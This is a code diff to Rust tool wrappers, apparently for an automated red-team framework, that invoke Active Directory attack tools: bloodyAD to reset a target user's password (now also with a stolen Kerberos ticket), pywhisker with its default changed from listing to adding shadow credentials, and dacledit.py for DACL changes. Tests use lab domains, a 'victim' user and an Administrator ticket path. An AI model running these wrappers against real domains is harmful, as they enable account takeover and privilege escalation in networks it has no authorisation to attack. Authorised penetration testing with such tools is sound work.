@@ -50,26 +50,52 @@ pub async fn bloodyad_add_group_member(args: &Value) -> Result<ToolOutput> {
 
 /// Set a user's password via `bloodyAD set password`.
 ///
-/// Required args: `domain`, `username`, `password`, `dc_ip`, `target_user`, `new_password`
+/// Required args: `domain`, `dc_ip`, `target_user`, `new_password`
+/// Auth — one of:
+///   - `username` + `password` (plaintext NTLM bind)
+///   - `ticket_path` (Kerberos ccache path; bloodyAD `-k -K <path>`)
+///
+/// When `ticket_path` is provided it takes precedence over password/hash.
+/// The env var `KRB5CCNAME` is set to the path so bloodyad's Kerberos stack
+/// picks it up without a separate `kinit` step.
 pub async fn bloodyad_set_password(args: &Value) -> Result<ToolOutput> {
     let domain = required_str(args, "domain")?;
-    let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let target_user = required_str(args, "target_user")?;
     let new_password = required_str(args, "new_password")?;
+    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
 
-    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
-
-    CommandBuilder::new("bloodyAD")
-        .args(creds)
-        .arg("set")
-        .arg("password")
-        .arg(target_user)
-        .arg(new_password)
-        .timeout_secs(60)
-        .execute()
-        .await
+    if let Some(tpath) = ticket_path {
+        // Kerberos mode: bloodyAD -d <domain> --host <dc_ip> -k -K <ccache>
+        CommandBuilder::new("bloodyAD")
+            .flag("-d", domain)
+            .flag("--host", dc_ip)
+            .arg("-k")
+            .flag("-K", tpath.to_string())
+            .arg("set")
+            .arg("password")
+            .arg(target_user)
+            .arg(new_password)
+            // KRB5CCNAME must also be set as an env var; some bloodyAD
+            // versions read it even when -K is passed.
+            .env("KRB5CCNAME", tpath)
+            .timeout_secs(60)
+            .execute()
+            .await
+    } else {
+        let username = required_str(args, "username")?;
+        let password = required_str(args, "password")?;
+        let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
+        CommandBuilder::new("bloodyAD")
+            .args(creds)
+            .arg("set")
+            .arg("password")
+            .arg(target_user)
+            .arg(new_password)
+            .timeout_secs(60)
+            .execute()
+            .await
+    }
 }
 
 /// Grant GenericAll rights via `bloodyAD add genericAll`.
@@ -152,14 +178,14 @@ pub async fn gmsa_read_password_bloodyad(args: &Value) -> Result<ToolOutput> {
 /// Manipulate msDS-KeyCredentialLink via `pywhisker.py`.
 ///
 /// Required args: `domain`, `username`, `password`, `dc_ip`, `target_samaccountname`
-/// Optional args: `action` (default: `"list"`)
+/// Optional args: `action` (default: `"add"`)
 pub async fn pywhisker(args: &Value) -> Result<ToolOutput> {
     let domain = required_str(args, "domain")?;
     let username = required_str(args, "username")?;
     let password = required_str(args, "password")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let target_sam = required_str(args, "target_samaccountname")?;
-    let action = optional_str(args, "action").unwrap_or("list");
+    let action = optional_str(args, "action").unwrap_or("add");
 
     CommandBuilder::new("pywhisker")
         .flag("-d", domain)
@@ -267,7 +293,7 @@ pub async fn dacl_edit(args: &Value) -> Result<ToolOutput> {
     let target_dn = required_str(args, "target_dn")?;
     let action = optional_str(args, "action").unwrap_or("write");
 
-    let target = credentials::impacket_target(Some(domain), username, Some(password), domain);
+    let target = credentials::impacket_target(Some(domain), username, Some(password), dc_ip);
 
     CommandBuilder::new("dacledit.py")
         .flag("-action", action)
@@ -503,8 +529,8 @@ mod tests {
             "dc_ip": "192.168.58.10",
             "target_samaccountname": "dc01$"
         });
-        let action = optional_str(&args, "action").unwrap_or("list");
-        assert_eq!(action, "list");
+        let action = optional_str(&args, "action").unwrap_or("add");
+        assert_eq!(action, "add");
     }
 
     #[test]
@@ -515,10 +541,10 @@ mod tests {
             "password": "P@ssw0rd!",
             "dc_ip": "192.168.58.10",
             "target_samaccountname": "dc01$",
-            "action": "add"
+            "action": "list"
         });
-        let action = optional_str(&args, "action").unwrap_or("list");
-        assert_eq!(action, "add");
+        let action = optional_str(&args, "action").unwrap_or("add");
+        assert_eq!(action, "list");
     }
 
     #[test]
@@ -859,6 +885,35 @@ mod tests {
             "dc_ip": "192.168.58.1", "target_user": "victim", "new_password": "NewP@ss!"
         });
         assert!(super::bloodyad_set_password(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn bloodyad_set_password_kerberos_mode_executes() {
+        // When ticket_path is supplied, bloodyAD should be invoked with -k -K
+        // rather than username/password. This verifies the Kerberos branch of
+        // bloodyad_set_password builds a valid command without erroring out.
+        mock::push(mock::success());
+        let args = json!({
+            "domain": "fabrikam.local",
+            "dc_ip": "192.168.58.20",
+            "target_user": "svc_exploit",
+            "new_password": "NewP@ss!99",
+            "ticket_path": "/tmp/ares-tickets/contoso_local__fabrikam_local__Administrator.ccache"
+        });
+        assert!(super::bloodyad_set_password(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn bloodyad_set_password_kerberos_missing_creds_still_needs_new_password() {
+        // ticket_path branch still requires new_password.
+        let args = json!({
+            "domain": "fabrikam.local",
+            "dc_ip": "192.168.58.20",
+            "target_user": "svc_exploit",
+            "ticket_path": "/tmp/ares-tickets/contoso_local__fabrikam_local__Administrator.ccache"
+            // new_password deliberately absent
+        });
+        assert!(required_str(&args, "new_password").is_err());
     }
 
     #[tokio::test]
